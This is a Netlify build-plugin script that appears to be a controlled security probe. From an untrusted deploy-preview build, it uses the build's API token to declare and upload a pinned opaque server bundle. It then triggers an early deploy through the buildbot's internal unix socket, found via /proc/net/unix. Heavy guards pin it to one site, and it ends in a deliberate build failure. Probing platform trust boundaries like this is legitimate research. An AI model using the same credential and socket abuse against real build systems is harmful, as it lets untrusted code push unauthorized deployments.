import { createHash } from 'node:crypto'
import {
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  realpathSync,
  rmSync,
  writeFileSync,
} from 'node:fs'
import { createConnection } from 'node:net'
import { dirname, relative, resolve } from 'node:path'

const EXPECTED_SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'
const EXPECTED_BRANCH = 'bot/untrusted-preview-probe-36495196637'
const EXPECTED_API_ORIGIN = 'https://api.netlify.com'
const SERVER_ROUTE = '/__nf_server_finalization_20260930'
const SERVER_BASE64_RELATIVE_PATH = 'plugins/untrusted-probe/server.tgz.base64'
const MAX_PUBLIC_FILES = 20
const MAX_SOCKET_RESPONSE_BYTES = 8_192
const EXPECTED_SERVER_SHA256 =
  '0af7768a988fa5c8f467bc390c96f7115d0a5644684b8c26c7bdddaf5817811e'
const EXPECTED_SERVER_BYTES = 238_828
const EXPECTED_SERVER_BASE64_BYTES = 318_440
const EXPECTED_PUBLIC_FILES = new Map([
  ['index.html', '082c212e8f7647d12f451edc3e6c7d152bf0fd5bd1bb372fcb897b9c04f781fe'],
])

const hash = (algorithm, bytes) => createHash(algorithm).update(bytes).digest('hex')

const normalizeApiBase = (value) =>
  /^https?:\/\//i.test(value || '') ? value : `https://${value || 'api.netlify.com'}`

const readSitePolicy = async ({ apiBase, token }) => {
  try {
    const response = await fetch(new URL(`/api/v1/sites/${EXPECTED_SITE_ID}`, apiBase), {
      headers: { authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    const body = response.ok ? await response.json() : null
    return {
      status: response.status,
      untrustedFlow: body?.build_settings?.untrusted_flow || null,
      publicRepo: body?.build_settings?.public_repo === true,
    }
  } catch (error) {
    return { requestFailed: true, errorClass: error?.constructor?.name || 'Error' }
  }
}

const readCurrentDeploy = async ({ apiBase, commitRef, deployId, token }) => {
  try {
    const response = await fetch(new URL(`/api/v1/deploys/${deployId}`, apiBase), {
      headers: { authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    const body = response.ok ? await response.json() : null
    return {
      status: response.status,
      deployIdMatches: body?.id === deployId,
      siteIdMatches: body?.site_id === EXPECTED_SITE_ID,
      contextMatches: body?.context === 'deploy-preview',
      branchMatches: body?.branch === EXPECTED_BRANCH,
      reviewIdMatches: String(body?.review_id) === '1',
      commitRefMatches: body?.commit_ref === commitRef,
      draftStatusMatches: body?.draft == null,
      preMutationState: body?.state === 'building',
      responseBodyRetained: false,
    }
  } catch (error) {
    return {
      requestFailed: true,
      errorClass: error?.constructor?.name || 'Error',
      responseBodyRetained: false,
    }
  }
}

const findBuildbotSocket = () => {
  try {
    const paths = readFileSync('/proc/net/unix', 'utf8')
      .split('\n')
      .slice(1)
      .filter(Boolean)
      .map((line) => line.trim().split(/\s+/)[7])
      .filter((path) => path && /(?:netlify|buildbot)/i.test(path) && !path.startsWith('@'))
    return paths.length === 1 ? paths[0] : null
  } catch {
    return null
  }
}

const requestEarlyDeploy = (deployDir) =>
  new Promise((resolveRequest) => {
    const socketPath = findBuildbotSocket()
    const result = {
      socketFound: Boolean(socketPath),
      connected: false,
      requestWritten: false,
      responseReceived: false,
      responseSucceeded: false,
      timedOut: false,
    }

    if (!socketPath) {
      resolveRequest(result)
      return
    }

    const responseChunks = []
    let responseBytes = 0
    let settled = false
    const client = createConnection({ path: socketPath })
    const finish = (parsed) => {
      if (settled) return
      settled = true
      clearTimeout(timer)
      client.destroy()
      result.responseWasJson = parsed !== undefined
      result.responseSucceeded = parsed?.succeeded === true
      result.responseErrorType = ['none', 'user', 'system'].includes(parsed?.values?.error_type)
        ? parsed.values.error_type
        : null
      resolveRequest(result)
    }
    const timer = setTimeout(() => {
      result.timedOut = true
      finish()
    }, 90_000)

    client.once('connect', () => {
      result.connected = true
      client.write(
        JSON.stringify({ action: 'deploySiteAndAwaitLive', deployDir, environment: [] }),
        (error) => {
          result.requestWritten = !error
          if (error) finish()
        },
      )
    })
    client.on('data', (chunk) => {
      result.responseReceived = true
      responseBytes += chunk.length
      if (responseBytes > MAX_SOCKET_RESPONSE_BYTES) {
        result.responseTooLarge = true
        finish()
        return
      }
      responseChunks.push(chunk)
      try {
        finish(JSON.parse(Buffer.concat(responseChunks, responseBytes).toString('utf8')))
      } catch {}
    })
    client.once('error', finish)
    client.once('close', finish)
  })

const collectFiles = (root, prefix = '') => {
  const records = []

  const visit = (directory, relativeDirectory = '') => {
    for (const entry of readdirSync(directory, { withFileTypes: true })) {
      const relativePath = relativeDirectory ? `${relativeDirectory}/${entry.name}` : entry.name
      const absolutePath = resolve(directory, entry.name)
      const stats = lstatSync(absolutePath)

      if (stats.isSymbolicLink()) {
        throw new Error('Symbolic links are not allowed in the controlled deploy input')
      }
      if (entry.isDirectory()) {
        visit(absolutePath, relativePath)
        continue
      }
      const safePath =
        /^[A-Za-z0-9._/-]+$/.test(relativePath) &&
        !relativePath.startsWith('/') &&
        !relativePath.includes('//') &&
        relativePath.split('/').every((segment) => segment !== '.' && segment !== '..')
      if (!entry.isFile() || !safePath) {
        throw new Error('Unexpected deploy input entry')
      }

      const bytes = readFileSync(absolutePath)
      records.push({
        absolutePath,
        bytes,
        normalizedPath: prefix ? `${prefix}/${relativePath}` : relativePath,
        sha1: hash('sha1', bytes),
        sha256: hash('sha256', bytes),
      })
    }
  }

  visit(root)
  return records
}

const requestPinnedEarlyDeploy = async ({ fileRecords, repositoryRoot }) => {
  const output = {
    snapshot: {
      created: false,
      validated: false,
      removed: false,
    },
    deploy: null,
  }
  let snapshotRoot = null

  try {
    snapshotRoot = mkdtempSync(resolve(repositoryRoot, '.netlify-controlled-server-finalize-'))
    const snapshotRelative = relative(repositoryRoot, snapshotRoot)
    if (
      !/^\.netlify-controlled-server-finalize-[A-Za-z0-9]+$/.test(snapshotRelative) ||
      snapshotRelative.includes('/')
    ) {
      throw new Error('Unexpected snapshot path')
    }
    output.snapshot.created = true

    for (const record of fileRecords) {
      const destination = resolve(snapshotRoot, record.normalizedPath)
      const destinationRelative = relative(snapshotRoot, destination)
      if (destinationRelative.startsWith('..') || destinationRelative === '') {
        throw new Error('Snapshot file escaped the controlled root')
      }
      mkdirSync(dirname(destination), { recursive: true, mode: 0o700 })
      writeFileSync(destination, record.bytes, { flag: 'wx', mode: 0o600 })
    }

    const expectedInventory = fileRecords
      .map(({ bytes, normalizedPath, sha1 }) => ({ bytes: bytes.length, normalizedPath, sha1 }))
      .sort((left, right) => left.normalizedPath.localeCompare(right.normalizedPath))
    const actualInventory = collectFiles(snapshotRoot)
      .map(({ bytes, normalizedPath, sha1 }) => ({ bytes: bytes.length, normalizedPath, sha1 }))
      .sort((left, right) => left.normalizedPath.localeCompare(right.normalizedPath))
    output.snapshot.validated =
      JSON.stringify(actualInventory) === JSON.stringify(expectedInventory)
    if (!output.snapshot.validated) {
      throw new Error('Pinned deploy snapshot validation failed')
    }

    output.deploy = await requestEarlyDeploy(snapshotRelative)
  } catch (error) {
    output.snapshot.errorClass = error?.constructor?.name || 'Error'
  } finally {
    if (snapshotRoot !== null) {
      const snapshotRelative = relative(repositoryRoot, snapshotRoot)
      if (/^\.netlify-controlled-server-finalize-[A-Za-z0-9]+$/.test(snapshotRelative)) {
        rmSync(snapshotRoot, { recursive: true, force: true })
        output.snapshot.removed = !existsSync(snapshotRoot)
      }
    }
  }

  return output
}


const loadPinnedServerArtifact = ({ repositoryRoot }) => {
  try {
    const repositoryRootReal = realpathSync(repositoryRoot)
    const sourcePath = resolve(repositoryRootReal, SERVER_BASE64_RELATIVE_PATH)
    const sourceStats = lstatSync(sourcePath)
    const sourceReal = realpathSync(sourcePath)
    const sourceRelative = relative(repositoryRootReal, sourceReal)
    const sourcePathValid =
      sourceStats.isFile() &&
      !sourceStats.isSymbolicLink() &&
      sourceRelative === SERVER_BASE64_RELATIVE_PATH

    if (!sourcePathValid) {
      throw new Error('Unexpected pinned Server artifact path')
    }

    const encoded = readFileSync(sourceReal, 'utf8').trim()
    const encodingShapeValid =
      encoded.length === EXPECTED_SERVER_BASE64_BYTES &&
      /^[A-Za-z0-9+/]+={0,2}$/.test(encoded)
    const serverBytes = encodingShapeValid ? Buffer.from(encoded, 'base64') : Buffer.alloc(0)
    const codeSha = hash('sha256', serverBytes)
    const roundTripMatches = serverBytes.toString('base64') === encoded
    const gzipMagicMatches = serverBytes[0] === 0x1f && serverBytes[1] === 0x8b
    const valid =
      sourcePathValid &&
      encodingShapeValid &&
      serverBytes.length === EXPECTED_SERVER_BYTES &&
      roundTripMatches &&
      gzipMagicMatches &&
      codeSha === EXPECTED_SERVER_SHA256

    return {
      bytes: valid ? serverBytes : null,
      codeSha: valid ? codeSha : null,
      evidence: {
        valid,
        source: 'pinned-github-fixture',
        sourcePathExact: sourceRelative === SERVER_BASE64_RELATIVE_PATH,
        encodingShapeValid,
        byteLengthMatchesPin: serverBytes.length === EXPECTED_SERVER_BYTES,
        digestMatchesPin: codeSha === EXPECTED_SERVER_SHA256,
        roundTripMatches,
        gzipMagicMatches,
        route: SERVER_ROUTE,
        digestValuesLogged: false,
      },
    }
  } catch (error) {
    return {
      bytes: null,
      codeSha: null,
      evidence: {
        valid: false,
        reason: 'pinned-server-artifact-read-failed',
        errorClass: error?.constructor?.name || 'Error',
        digestValuesLogged: false,
      },
    }
  }
}

const declareDeploy = async ({
  apiBase,
  body,
  commitRef,
  deployId,
  fileRecords,
  serverSha,
  token,
}) => {
  try {
    const response = await fetch(
      new URL(`/api/v1/sites/${EXPECTED_SITE_ID}/deploys/${deployId}`, apiBase),
      {
        method: 'PUT',
        headers: {
          authorization: `Bearer ${token}`,
          'content-type': 'application/json',
        },
        body: JSON.stringify(body),
        redirect: 'error',
        signal: AbortSignal.timeout(20_000),
      },
    )
    const responseBody = response.ok ? await response.json() : null
    const requiredFiles = Array.isArray(responseBody?.required) ? responseBody.required : []
    const requiredEdgeFunctions = Array.isArray(responseBody?.required_edge_functions)
      ? responseBody.required_edge_functions
      : []
    const requiredFunctions = Array.isArray(responseBody?.required_functions)
      ? responseBody.required_functions
      : []
    const requiredServer = Array.isArray(responseBody?.required_server)
      ? responseBody.required_server
      : []
    const knownFileHashes = new Set(fileRecords.map((record) => record.sha1))
    const requiredArraysValid =
      Array.isArray(responseBody?.required) &&
      (responseBody?.required_edge_functions == null ||
        Array.isArray(responseBody.required_edge_functions)) &&
      (responseBody?.required_functions == null || Array.isArray(responseBody.required_functions)) &&
      Array.isArray(responseBody?.required_server)
    const requiredFilesUnique = new Set(requiredFiles).size === requiredFiles.length
    const requiredServerUnique =
      new Set(requiredServer).size === requiredServer.length && requiredServer.length === 1
    const requiredFilesAllKnown = requiredFiles.every((required) => knownFileHashes.has(required))
    const requiredServerAllKnown = requiredServer.every((required) => required === serverSha)
    const deployIdMatches = responseBody?.id === deployId
    const siteIdMatches = responseBody?.site_id === EXPECTED_SITE_ID
    const contextMatches = responseBody?.context === 'deploy-preview'
    const branchMatches = responseBody?.branch === EXPECTED_BRANCH
    const reviewIdMatches = String(responseBody?.review_id) === '1'
    const commitRefMatches = responseBody?.commit_ref === commitRef
    const draftStatusMatches = responseBody?.draft == null
    const serverResponseAbsentOrMatches =
      responseBody?.server == null || responseBody.server?.sha === serverSha
    const preFinalizationState = ['building', 'uploading', 'uploaded', 'prepared'].includes(
      responseBody?.state,
    )

    const evidence = {
      status: response.status,
      ok: response.ok,
      deployIdMatches,
      siteIdMatches,
      contextMatches,
      branchMatches,
      reviewIdMatches,
      commitRefMatches,
      draftStatusMatches,
      serverResponseAbsentOrMatches,
      preFinalizationState,
      state: ['building', 'uploading', 'uploaded', 'prepared', 'ready', 'error'].includes(
        responseBody?.state,
      )
        ? responseBody.state
        : null,
      requiredFileCount: requiredFiles.length,
      requiredEdgeFunctionCount: requiredEdgeFunctions.length,
      requiredFunctionCount: requiredFunctions.length,
      requiredServerCount: requiredServer.length,
      requiredFilesAllKnown,
      requiredServerAllKnown,
      requiredArraysValid,
      requiredFilesUnique,
      requiredServerUnique,
      responseBodyRetained: false,
    }

    return {
      evidence,
      requiredFiles,
      requiredServer,
      safeToUpload:
        response.status === 200 &&
        deployIdMatches &&
        siteIdMatches &&
        contextMatches &&
        branchMatches &&
        reviewIdMatches &&
        commitRefMatches &&
        draftStatusMatches &&
        serverResponseAbsentOrMatches &&
        preFinalizationState &&
        requiredArraysValid &&
        requiredFilesUnique &&
        requiredServerUnique &&
        requiredFilesAllKnown &&
        requiredServerAllKnown &&
        requiredFunctions.length === 0 &&
        requiredEdgeFunctions.length === 0,
    }
  } catch (error) {
    return {
      evidence: {
        requestFailed: true,
        errorClass: error?.constructor?.name || 'Error',
        responseBodyRetained: false,
      },
      requiredFiles: [],
      requiredServer: [],
      safeToUpload: false,
    }
  }
}

const uploadStaticFile = async ({ apiBase, deployId, record, token }) => {
  try {
    const encodedPath = record.normalizedPath.split('/').map(encodeURIComponent).join('/')
    if (decodeURIComponent(encodedPath) !== record.normalizedPath) {
      throw new Error('Ambiguous deploy file path')
    }
    const expectedPathname = `/api/v1/deploys/${deployId}/files/${encodedPath}`
    const url = new URL(expectedPathname, apiBase)
    if (url.pathname !== expectedPathname) {
      throw new Error('Deploy file path did not round-trip')
    }
    url.searchParams.set('size', String(record.bytes.length))
    const response = await fetch(url, {
      method: 'PUT',
      headers: {
        authorization: `Bearer ${token}`,
        'content-type': 'application/octet-stream',
      },
      body: record.bytes,
      redirect: 'error',
      signal: AbortSignal.timeout(20_000),
    })
    await response.body?.cancel()
    return { status: response.status, ok: response.ok, responseBodyRead: false }
  } catch (error) {
    return {
      requestFailed: true,
      errorClass: error?.constructor?.name || 'Error',
      responseBodyRead: false,
    }
  }
}


const uploadServerBundle = async ({ apiBase, bytes, codeSha, deployId, token }) => {
  try {
    const expectedPathname = `/api/v1/deploys/${deployId}/server/${codeSha}`
    const url = new URL(expectedPathname, apiBase)
    if (url.pathname !== expectedPathname) {
      throw new Error('Server upload path did not round-trip')
    }

    const response = await fetch(url, {
      method: 'PUT',
      headers: {
        authorization: `Bearer ${token}`,
        'content-type': 'application/octet-stream',
      },
      body: bytes,
      redirect: 'error',
      signal: AbortSignal.timeout(30_000),
    })
    await response.body?.cancel()
    return { status: response.status, ok: response.ok, responseBodyRead: false }
  } catch (error) {
    return {
      requestFailed: true,
      errorClass: error?.constructor?.name || 'Error',
      responseBodyRead: false,
    }
  }
}

export const onPostBuild = async ({ constants, utils }) => {
  const repositoryRoot = resolve(process.cwd())
  const publishDir = resolve(constants.PUBLISH_DIR || '')
  const deployDir = relative(repositoryRoot, publishDir) || '.'
  const deployId = process.env.DEPLOY_ID || ''
  const commitRef = process.env.COMMIT_REF || ''
  const token = constants.NETLIFY_API_TOKEN
  const apiBase = normalizeApiBase(constants.NETLIFY_API_HOST)
  let apiEndpointTrusted = false
  try {
    const parsedApiBase = new URL(apiBase)
    apiEndpointTrusted =
      parsedApiBase.origin === EXPECTED_API_ORIGIN &&
      parsedApiBase.pathname === '/' &&
      parsedApiBase.search === '' &&
      parsedApiBase.hash === '' &&
      parsedApiBase.username === '' &&
      parsedApiBase.password === ''
  } catch {}

  const policy =
    apiEndpointTrusted && typeof token === 'string' && token.length > 0
      ? await readSitePolicy({ apiBase, token })
      : null
  const currentDeploy =
    apiEndpointTrusted &&
    typeof token === 'string' &&
    token.length > 0 &&
    /^[0-9a-f]{24}$/.test(deployId) &&
    /^[0-9a-f]{40}$/.test(commitRef)
      ? await readCurrentDeploy({ apiBase, commitRef, deployId, token })
      : null
  const serverArtifact = loadPinnedServerArtifact({ repositoryRoot })

  let publicRecords = []
  let publicFilesError = null
  try {
    const repositoryRootReal = realpathSync(repositoryRoot)
    const publishDirStats = lstatSync(publishDir)
    const publishDirReal = realpathSync(publishDir)
    const publishRelativeReal = relative(repositoryRootReal, publishDirReal)
    if (
      !publishDirStats.isDirectory() ||
      publishDirStats.isSymbolicLink() ||
      publishRelativeReal !== 'public'
    ) {
      throw new Error('Unexpected publish root')
    }
    publicRecords = collectFiles(publishDirReal)
  } catch (error) {
    publicFilesError = error?.constructor?.name || 'Error'
  }

  const fileRecords = publicRecords
  const declaredPathsUnique =
    new Set(fileRecords.map((record) => record.normalizedPath)).size === fileRecords.length
  const publicFilesExact =
    publicRecords.length === EXPECTED_PUBLIC_FILES.size &&
    publicRecords.every(
      (record) => EXPECTED_PUBLIC_FILES.get(record.normalizedPath) === record.sha256,
    )
  const prerequisites = {
    deployPreview: process.env.CONTEXT === 'deploy-preview',
    controlledReview: process.env.REVIEW_ID === '1',
    controlledSite: constants.SITE_ID === EXPECTED_SITE_ID,
    buildbotMode: constants.IS_LOCAL === false,
    trustedApiEndpoint: apiEndpointTrusted,
    policyReadSucceeded: policy?.status === 200,
    redactedPolicy: policy?.untrustedFlow === 'redact',
    publicRepository: policy?.publicRepo === true,
    deployIdPresent: /^[0-9a-f]{24}$/.test(deployId),
    commitRefPresent: /^[0-9a-f]{40}$/.test(commitRef),
    currentDeployReadSucceeded: currentDeploy?.status === 200,
    currentDeployBindingExact:
      currentDeploy?.deployIdMatches === true &&
      currentDeploy?.siteIdMatches === true &&
      currentDeploy?.contextMatches === true &&
      currentDeploy?.branchMatches === true &&
      currentDeploy?.reviewIdMatches === true &&
      currentDeploy?.commitRefMatches === true &&
      currentDeploy?.draftStatusMatches === true &&
      currentDeploy?.preMutationState === true,
    tokenPresent: typeof token === 'string' && token.length > 0,
    publishDirectoryExpected: deployDir === 'public',
    publicFilesReadable: publicFilesError === null,
    publicFileCountSafe: publicRecords.length > 0 && publicRecords.length <= MAX_PUBLIC_FILES,
    publicFilesExact,
    declaredPathsUnique,
    serverArtifactValid: serverArtifact.evidence?.valid === true,
  }
  const result = {
    schema: 'netlify-untrusted-server-finalization.v1',
    prerequisites,
    policy,
    currentDeploy,
    serverArtifact: serverArtifact.evidence,
    publicFileCount: publicRecords.length,
    declaredFileCount: fileRecords.length,
    attempted: false,
    declare: null,
    uploads: null,
    snapshot: null,
    deploy: null,
    controlledFailureRequested: false,
    credentialValuesLogged: false,
    digestValuesLogged: false,
    responseBodiesRetained: false,
    syntheticOnly: true,
  }

  if (!Object.values(prerequisites).every(Boolean)) {
    console.log(`NETLIFY_UNTRUSTED_SERVER_FINALIZATION ${JSON.stringify(result)}`)
    utils.build.failBuild('Controlled Server probe prerequisites were not satisfied')
    return
  }

  result.attempted = true
  const files = Object.fromEntries(fileRecords.map((record) => [record.normalizedPath, record.sha1]))
  const declare = await declareDeploy({
    apiBase,
    body: {
      files,
      functions: {},
      edge_functions: {},
      server: { sha: serverArtifact.codeSha },
      function_schedules: [],
      functions_config: {},
      async: false,
    },
    commitRef,
    deployId,
    fileRecords,
    serverSha: serverArtifact.codeSha,
    token,
  })
  result.declare = declare.evidence

  if (declare.safeToUpload) {
    const recordsByHash = new Map()
    for (const record of fileRecords) {
      const existing = recordsByHash.get(record.sha1) || []
      existing.push(record)
      recordsByHash.set(record.sha1, existing)
    }

    const staticUploads = []
    for (const requiredHash of declare.requiredFiles) {
      for (const record of recordsByHash.get(requiredHash) || []) {
        staticUploads.push(await uploadStaticFile({ apiBase, deployId, record, token }))
      }
    }

    let serverUpload = { required: false, status: null, ok: false, responseBodyRead: false }
    if (declare.requiredServer.includes(serverArtifact.codeSha)) {
      serverUpload = {
        required: true,
        ...(await uploadServerBundle({
          apiBase,
          bytes: serverArtifact.bytes,
          codeSha: serverArtifact.codeSha,
          deployId,
          token,
        })),
      }
    }

    const staticUploadsAllSucceeded = staticUploads.every((upload) => upload.ok === true)
    const serverUploadSucceeded = serverUpload.required === true && serverUpload.ok === true
    result.uploads = {
      staticUploadCount: staticUploads.length,
      staticUploadsAllSucceeded,
      serverUpload,
    }

    if (staticUploadsAllSucceeded && serverUploadSucceeded) {
      const pinnedDeploy = await requestPinnedEarlyDeploy({ fileRecords, repositoryRoot })
      result.snapshot = pinnedDeploy.snapshot
      result.deploy = pinnedDeploy.deploy
    }
  }

  result.controlledFailureRequested = true
  console.log(`NETLIFY_UNTRUSTED_SERVER_FINALIZATION ${JSON.stringify(result)}`)
  utils.build.failBuild('Controlled failure after same-deploy Netlify Server finalization probe')
}
